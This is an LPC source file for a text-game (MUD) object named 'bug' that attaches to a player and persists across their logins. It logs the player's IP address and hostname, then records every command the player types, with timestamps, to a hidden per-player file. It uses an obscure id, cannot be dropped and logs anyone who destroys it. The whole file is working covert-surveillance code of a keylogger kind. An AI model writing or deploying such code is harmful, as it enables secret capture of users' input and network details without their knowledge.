#define ID "newbaka"
#define SAVEPATH "/players/feldegast/closed/recon/"
#define FILENAME "/players/feldegast/closed/tool/bug"

object targ;

query_auto_load() {
  return FILENAME+":";
}

init_arg(str) {
  if(this_player())
    write_file(SAVEPATH+this_player()->query_real_name(),
      this_player()->query_real_name()+
      " "+query_ip_number(this_player())+"  "+ this_player()->query_hostname()+"\n\n");
}

reset(arg) {
  if(arg) return;
  call_out("mememe",5);
}

query_prevent_shadow() { return 1; } 

get() { return 1; }
drop() { return 1; }

id(str) { return str == ID; }

init() {
  if(!targ) targ=this_player();
  add_action("catch_cmd");add_xverb("!");
  add_action("catch_cmd"); add_xverb("");
}

catch_cmd(str) {
  object ob;
  if(!this_player()) return;
  if(!this_player()->query_real_name()) return;
  write_file(SAVEPATH+this_player()->query_real_name(),
    ctime(time())+" "+query_verb()+" "+str+"\n");
  return 0;
}

mememe() {
  if(environment()!=targ)
    destruct(this_object());
  if(environment(this_object()))
    move_object(this_object(),environment(this_object()));
  if(environment())
  call_out("mememe",50);
  return 1;
}

remove_object() {
  if(!targ) return;
  if(this_player())
    write_file(SAVEPATH+targ->query_real_name(),
      ctime(time())+" Bug destructed by "+this_player()->query_real_name()+"\n");
}
